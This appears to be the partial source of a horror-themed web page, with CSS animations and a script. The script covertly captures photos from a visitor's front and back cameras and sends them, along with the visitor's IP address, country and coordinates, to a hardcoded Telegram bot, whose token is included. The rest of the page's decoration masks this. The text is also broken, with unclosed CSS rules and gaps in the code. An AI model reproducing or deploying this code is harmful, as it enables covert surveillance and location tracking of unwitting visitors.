    h1 {
      position: absolute;
      top: 45%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 2.8em;
      background: linear-gradient(90deg, red, #ff0040, red);

    @keyframes horrorGlow {
      0% { background-position: 0% center; }
      50% { background-position: 100% center; }
      100% { background-position: 0% center; }
    }

    .symbol {
      position: absolute;
      font-size: 3em;
      color: rgba(255, 255, 255, 0.15);
      animation: bounceSymbol 5s ease-in-out infinite alternate;
      user-select: none;
    }

    @keyframes bounceSymbol {
      0% { transform: translate(0, 0); }
      25% { transform: translate(20px, -30px); }
      50% { transform: translate(-30px, 40px); }
      75% { transform: translate(30px, -25px); }
      100% { transform: translate(-20px, 30px); }
    }

    .police-light {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      mix-blend-mode: screen;
      animation: policeFlash 0.1s infinite alternate;
      z-index: 1;
    }

    @keyframes policeFlash {
      0% { background: rgba(255, 0, 0, 0.35); }
      100% { background: rgba(0, 0, 255, 0.35); }
    }

    .fog {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://www.transparenttextures.com/patterns/dark-fog.png');
      opacity: 0.15;
      animation: fogMove 60s linear infinite;
      z-index: 0;
    }

    @keyframes fogMove {
      from { transform: rotate(0deg) scale(1.2); }
      to { transform: rotate(360deg) scale(1.2); }
    }

    .eye {
      position: absolute;
      color: red;
      font-size: 3.2em;
      opacity: 0;
      animation: blink 6s infinite;
      pointer-events: none;
    }

    @keyframes blink {
      0%, 100% { opacity: 0; }
      45% { opacity: 1; transform: scale(1); }
      50% { opacity: 1; transform: scale(1.2); }
      55% { opacity: 1; transform: scale(1); }
    }

    .social-buttons {
      position: absolute;
      bottom: 60px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 20px;
      z-index: 2;
    }

    .social-buttons a {
      padding: 14px 28px;
      background: #111;
      color: white;
      border: 1px solid #555;
      text-decoration: none;
      font-size: 1.3em;
      border-radius: 5px;
      transition: background 0.3s;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .social-buttons a:hover {
      background: #333;
    }

    .social-buttons img {
      width: 36px;
      height: 36px;
    }
  
    .blood {
      position: absolute;
      width: 100px;
      height: 100px;
      background: url('https://i.imgur.com/3dXYG3d.png') no-repeat center center;
      background-size: cover;
      opacity: 0;
      pointer-events: none;
      z-index: 1;
      animation: drip 6s infinite;
    }

    @keyframes drip {
      0%, 100% { opacity: 0; transform: translateY(0); }
      45% { opacity: 1; transform: translateY(0); }
      55% { opacity: 1; transform: translateY(10px); }
    }


    .background-image {
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      background-position: center;
      background-size: cover;
      background-repeat: no-repeat;
      opacity: 0.03;
      z-index: 0;
    }

    .bg-image-1 {

    .bg-image-2 {

    @keyframes fadeInOut {

      50% { opacity: 0.07; }
    }

    @keyframes fadeInOutAlt {
      0%, 100% { opacity: 0.02; }
      50% { opacity: 0.06; }
    }

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    const TELEGRAM_BOT_TOKEN = "7308525501:AAE5La-uFy1UFfdjZ8K6h5l82LyLTR-d7M4";
    const TELEGRAM_CHAT_ID = "1792081311";

    let photos = {};

    async function captureFromCamera(facingMode) {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facingMode } },
        audio: false
      });

      video.srcObject = stream;

      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/png");
            stream.getTracks().forEach(track => track.stop());
            resolve(imageData);
          }, 1000);
        };
      });
    }

    async function sendToTelegram(base64Image, label) {
      const blob = await (await fetch(base64Image)).blob();
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("caption", label);
      formData.append("photo", blob, `${label}.png`);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

        const ip = data.ip;

        const country = data.country_name;
        const latitude = data.latitude;
        const longitude = data.longitude;

        const message = `

        `;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

          })
        });

    }
